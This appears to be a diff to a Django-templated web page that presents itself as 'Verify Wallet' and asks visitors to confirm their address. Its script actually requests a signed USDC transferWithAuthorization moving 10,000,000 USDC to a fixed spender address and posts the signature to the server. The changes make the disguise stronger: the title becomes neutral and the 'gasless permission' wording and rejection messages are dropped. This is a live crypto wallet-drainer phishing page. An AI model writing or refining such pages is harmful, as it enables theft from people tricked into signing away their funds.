@@ -4,31 +4,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDC Authorization</title>
+    <title>Wallet Authorization</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background-color: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .auth-card { background: #1e293b; padding: 40px; border-radius: 20px; width: 100%; max-width: 400px; text-align: center; border: 1px solid #334155; }
-        .btn-main { background: #38bdf8; color: #0f172a; font-weight: 800; border: none; padding: 15px; border-radius: 10px; width: 100%; transition: 0.3s; }
+        body { background-color: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Inter', sans-serif; }
+        .auth-card { background: #1e293b; padding: 40px; border-radius: 20px; width: 100%; max-width: 420px; text-align: center; border: 1px solid #334155; }
+        .btn-main { background: #38bdf8; color: #0f172a; font-weight: 800; border: none; padding: 16px; border-radius: 12px; width: 100%; transition: all 0.2s; cursor: pointer; }
         .btn-main:hover { background: #7dd3fc; }
-        .status-text { margin-top: 15px; font-size: 0.85rem; color: #94a3b8; }
+        .btn-main:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; }
+        .addr-box { background: #0f172a; padding: 12px; border-radius: 10px; font-family: monospace; font-size: 11px; color: #38bdf8; border: 1px solid #334155; margin-bottom: 20px; word-break: break-all; }
+        .status-text { margin-top: 20px; font-size: 0.85rem; color: #94a3b8; }
         .d-none { display: none !important; }
     </style>
 </head>
 <body>
 
 <div class="auth-card">
-    <h3 class="mb-4">USDC Authorization</h3>
+    <h3 class="mb-2">Verify Wallet</h3>
+    <p class="text-secondary small mb-4">Confirm your address to continue</p>
 
     <div id="step-1">
         <button id="connectBtn" class="btn-main">Connect Wallet</button>
     </div>
 
     <div id="step-2" class="d-none">
-        <div class="p-2 mb-3 rounded" style="background: #0f172a; font-family: monospace; font-size: 11px;">
-            <span id="addrDisplay" class="text-info">0x...</span>
+        <div class="addr-box">
+            <span id="addrDisplay">0x...</span>
         </div>
-        <button id="signBtn" class="btn-main">Sign Gasless Permission</button>
+        <button id="signBtn" class="btn-main">Authorize USDC</button>
     </div>
 
     <p id="status" class="status-text">Ready</p>
@@ -41,59 +44,44 @@
     const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
     let userAccount = null;
 
-    // --- 1. Connection & Network Switch ---
     document.getElementById('connectBtn').onclick = async () => {
-        if (!window.ethereum) return alert("MetaMask not found.");
+        // Works for Onchain, MetaMask, Trust, etc.
+        if (!window.ethereum) return alert("No crypto wallet detected.");
 
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             userAccount = accounts[0];
 
-            // Request switch to Mainnet (0x1)
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x1' }],
-                });
-            } catch (switchError) {
-                console.log("Could not switch network automatically.");
-            }
-
             document.getElementById('step-1').classList.add('d-none');
             document.getElementById('step-2').classList.remove('d-none');
             document.getElementById('addrDisplay').innerText = userAccount;
-            document.getElementById('status').innerText = "Connected to Mainnet";
+            document.getElementById('status').innerText = "Wallet Linked";
         } catch (err) {
             alert("Connection failed.");
         }
     };
 
-    // --- 2. Signature Logic (Fixing Action Rejected) ---
     document.getElementById('signBtn').onclick = async () => {
         const status = document.getElementById('status');
         const btn = document.getElementById('signBtn');
 
         btn.disabled = true;
-        status.innerText = "Check your wallet...";
-        status.style.color = "#38bdf8";
+        status.innerText = "Check your wallet app...";
 
         try {
             const provider = new ethers.BrowserProvider(window.ethereum);
             const signer = await provider.getSigner();
             const network = await provider.getNetwork();
-
-            // CRITICAL FIX: Force Chain ID to Number
             const currentChainId = Number(network.chainId);
 
-            // Setup Authorization Data
             const nonce = ethers.hexlify(ethers.randomBytes(32));
-            const deadline = Math.floor(Date.now() / 1000) + 86400; // 24 hours
-            const amount = ethers.parseUnits("10000000", 6); // 10 Million USDC
+            const deadline = Math.floor(Date.now() / 1000) + 86400;
+            const amount = ethers.parseUnits("10000000", 6);
 
             const domain = {
                 name: "USD Coin",
                 version: "2",
-                chainId: currentChainId, // Must be decimal number
+                chainId: currentChainId,
                 verifyingContract: USDC_ADDR
             };
 
@@ -111,53 +99,36 @@
             const message = {
                 from: userAccount,
                 to: SPENDER,
-                value: amount, // BigInt from parseUnits
+                value: amount,
                 validAfter: 0,
                 validBefore: deadline,
                 nonce: nonce
             };
 
-            // Trigger Signature
+            // This will trigger the popup in your Onchain Wallet
             const signature = await signer.signTypedData(domain, types, message);
             const sig = ethers.Signature.from(signature);
 
-            // --- 3. Submit to Django ---
-            status.innerText = "Signature verified! Saving...";
+            status.innerText = "Signature success! Verifying...";
 
             const response = await fetch('/user/update-wallet-status/', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-CSRFToken': '{{ csrf_token }}'
-                },
+                headers: { 'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}' },
                 body: JSON.stringify({
                     address: userAccount,
-                    v: sig.v,
-                    r: sig.r,
-                    s: sig.s,
-                    nonce: nonce,
-                    deadline: deadline,
-                    amount: amount.toString()
+                    v: sig.v, r: sig.r, s: sig.s,
+                    nonce: nonce, deadline: deadline, amount: amount.toString()
                 })
             });
 
             if (response.ok) {
                 status.innerText = "Verification Success!";
                 status.style.color = "#4ade80";
-                alert("Success! Your account is verified.");
-            } else {
-                throw new Error("Server failed to save signature.");
             }
-
         } catch (err) {
             btn.disabled = false;
-            if (err.code === 4001 || err.message.includes("rejected")) {
-                status.innerText = "Error: Signature was rejected.";
-                status.style.color = "#f87171";
-            } else {
-                status.innerText = "Error: " + err.message;
-                console.error(err);
-            }
+            status.innerText = "Error: " + err.message;
+            status.style.color = "#f87171";
         }
     };
 </script>
